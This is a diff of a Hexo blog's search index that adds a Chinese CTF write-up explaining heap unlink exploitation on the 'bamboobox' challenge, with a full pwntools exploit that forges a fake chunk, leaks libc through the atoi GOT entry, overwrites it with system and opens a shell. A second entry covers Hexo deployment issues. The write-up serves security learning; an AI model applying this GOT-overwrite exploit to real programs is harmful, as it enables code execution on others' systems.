@@ -1,6 +1,19 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[pwn heap unlink, 以hitcontraining_bambobox为例]]></title>
+    <url>%2F2021%2F09%2F04%2Fpwn-heap-unlink-%E4%BB%A5hitcontraining-bambobox%E4%B8%BA%E4%BE%8B%2F</url>
+    <content type="text"><![CDATA[前言最近把pwn堆溢出的unlink类型给弄懂了。现在来以一道例题bamboobox详解一下。unlink原理有两个chunk，分别是a，b。假设a可以编辑，那么可以在a中伪造一个fake chunk，并覆盖下一个chunk(即b)的chunk头，使系统在执行free时认为a，b都没有被使用(但事实上a被使用了，fake chunk让系统认为a没被使用)，那么系统会执行unlink操作。unlink之后，chunk a会直接指向chunk a的原本地址减去0x18(64位系统)的位置。这个时候就能操纵这个地址了，我们再填充0x18字节，再加上函数got，即可泄露或替换函数以get shell。具体的fake chunk怎么构造，Exp有详细的步骤，而且基本都是固定的套路。可以去看一看heap的结构以加深理解。Ida界面这个程序是一个标准的记事本类型。直接看函数：showaddchangeremove逻辑梳理通过Ida逆向出的代码，可以看到几个重要的变量qword_6020C8和itemList(这个itemList比较迷惑人，实际就是用于存储item长度，见如下分析)，在内存中的位置如下：而hex(0x602700-0x6020C0) = 0x640，结合整个代码，可以看出这是存放item的变量，而且从逆向出的代码可以知道item最多有100个，而0x640 / 100 = 16，正好是两个0x8，而bamboobox是64位程序。再结合代码，分析出item可能是一个结构体，第一个变量存储item的长度，第二个变量则是item名字指针。关键分析代码如下：看得出来，这个qword_6020C8[0]就是存放的第一个item名字指针，而且使用malloc开辟空间，那么可以使用unlink操控这个位置的地址，替换成system的地址，得到shell。Exp#coding=utf-8from pwn import *from LibcSearcher import *#context.log_level = "debug"#p = process('./bamboobox')p = remote('node4.buuoj.cn', 28131)elf = ELF('./bamboobox')def show(): p.recvuntil(":") p.sendline("1") def add(length, name): p.recvuntil(":") p.sendline("2") p.recvuntil(":") p.sendline(str(length)) p.recvuntil(":") p.sendline(name) def change(index, length, name): p.recvuntil(":") p.sendline("3") p.recvuntil(":") p.sendline(str(index)) p.recvuntil(":") p.sendline(str(length)) p.recvuntil(":") p.sendline(name) def remove(index): p.recvuntil(":") p.sendline("4") p.recvuntil(":") p.sendline(str(index)) add(0x80, 'a'*0x8) #分配0x80大小的空间aadd(0x80, 'b'*0x8) #分配0x80大小的空间b#add(0x80, 'c'*0x8)itemList = 0x6020C8 #要操控的目的地址fake = p64(0) #prev_sizefake += p64(0x81) #size 这个size包括data和chunk头的大小fake += p64(itemList - 0x18) #这两行是固定的绕过套路，但需要注意前向后向合并fake += p64(itemList - 0x10) #的区别. 这样绕过后，会使指针指向itemList-0x18的位置fake += 'a'*0x60 #填充无用的datafake += p64(0x80) #这两行是下一个chunk的头, 即空间b. prev_size = 空间a的大小: 0x80fake += p64(0x90) #size = chunk头大小0x10 + 空间b的data大小0x80 = 0x90change(0, 0x90, fake) #在空间a中伪造fake chunk并覆盖空间b的chunk头, 所以这里是0x90(0x80+0x10), 其实只要能覆盖，这个大小调大一点也可以remove(1) #触发unlinkpayload = p64(0)*3 #上面提到指针指向的是itemList-0x18的位置，所以需要填充0x18payload += p64(elf.got['atoi']) #程序使用了atoi函数, 通过泄露该函数got来寻找libcchange(0, 0x80, payload) #发送payload使其生效, 并且第二个参数必须是0x80或0x90, 防止破坏堆结构，造成get shell失败.show()print p.recvuntil("0 : ") atoi_addr = u64(p.recv()[:6].ljust(8, '\x00')) #这个[:6]需要微微调试才知道具体的地址泄露范围是多少, 这里是6libc = LibcSearcher("atoi", atoi_addr)libc_base = atoi_addr - libc.dump('atoi')system_addr = libc_base + libc.dump('system')change(0, 0x8, p64(system_addr)) #此时这个地址是atoi的got表地址, 又是指针，所以会把atoi函数替换成systemp.recvuntil(':')p.sendline('/bin/sh') #这里atoi已经被替换为system, 因此执行atoi就是执行system("/bin/sh")p.interactive()总结pwn的堆实在是花样繁多，还需努力学习。]]></content>
+      <categories>
+        <category>心得小谈</category>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>CTF</tag>
+        <tag>Pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[部署hexo遇到的问题]]></title>
     <url>%2F2021%2F02%2F22%2F%E9%83%A8%E7%BD%B2hexo%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%2F</url>
     <content type="text"><![CDATA[前言最近发现我在19年发布的关于部署hexo的文章还是挺多人看的，在这里记录一下读者遇到的一些问题和解决方法。解决方法一：手动输入有读者遇到如下问题，乍一看似乎是文件未找到，实际情况却是文件存在，只是文件存在未知符号。我们可以手动输入post-receive的内容，这位读者就是如此解决的。当然，直接使用vim编辑文件也是可以的。未知的答案这个问题由于读者没有回复是否解决，因此我也不知道解决办法。我怀疑是他的密码在哪一步输错了，因为我试了试，输错密码会出现类似错误。其余问题由于时间原因，我忘记了。这里贴出参考了我的文章，经读者优化后的部署步骤：https://blog.csdn.net/qq_34272417/article/details/106914041]]></content>
